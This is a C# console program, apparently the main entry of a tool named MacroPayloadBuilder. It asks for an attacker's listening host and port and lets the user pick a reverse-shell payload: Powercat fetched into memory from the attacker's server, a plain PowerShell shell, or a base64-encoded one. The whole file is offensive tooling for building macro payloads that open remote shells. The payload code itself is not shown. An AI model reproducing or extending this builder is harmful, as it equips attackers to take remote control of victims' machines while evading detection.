using MacroPayloadBuilder;
using System.Text;

internal class Program
{
    private static void Main(string[] args)
    {
        Payloads payloads = new Payloads();
        bool exit = false;
        Console.WriteLine("Please enter the LHOST:");
        string lhost = Console.ReadLine();
        Console.WriteLine("\nPlease enter the LPORT:");
        string lport = Console.ReadLine();

        while (!exit)
        {
            Console.WriteLine("Please choose your reverse-shell payload:\n");
            Console.WriteLine("1: Encoded Powercat downloaded into memory (needs a server hosting Powercat.ps1 on the same IP as LHOST)");
            Console.WriteLine("2: Powershell standard");
            Console.WriteLine("3: Powershell base64 encoded");
            Console.WriteLine("E: exit");
            string option = Console.ReadLine();

            switch (option)
            {
                case "1":
                    payloads.encodedPowerCat(lhost, lport);
                    exit = true;
                    break;
                case "2":
                    payloads.powerShellStandard(lhost, lport);
                    exit = true;
                    break;
                case "3":
                    payloads.powershellEncoded(lhost, lport);
                    exit= true;
                    break;
                case "E" or "e":
                    Environment.Exit(0);
                    break;
                default:
                    break;
            }
        }
    }
}